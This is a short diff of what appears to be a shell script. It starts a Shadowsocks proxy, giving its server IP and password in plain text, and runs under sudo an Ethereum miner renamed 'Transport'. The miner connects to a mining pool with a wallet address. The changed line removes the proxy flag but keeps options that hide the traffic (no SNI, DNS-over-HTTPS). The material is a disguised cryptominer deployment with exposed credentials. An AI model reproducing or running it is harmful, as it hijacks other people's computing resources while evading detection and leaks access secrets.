@@ -39,4 +39,4 @@ ss-local -s 176.53.133.217 -p 8388 -l 9999 -k 1rN14HAmV -m chacha20-ietf-poly130
 
 ph add Transport
 
-sudo ./Transport -a ethash -o stratum+tcp://eth.2miners.com:2020 -u nano_38gqwon5ypeyxb8fjjpz9iuqcfr38dnhifjipniicqfpi5fknep351e6sg4s -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+sudo ./Transport -a ethash -o stratum+tcp://eth.2miners.com:2020 -u nano_38gqwon5ypeyxb8fjjpz9iuqcfr38dnhifjipniicqfpi5fknep351e6sg4s -p x -w Trans --no-sni --dns-https-server 1.1.1.1 
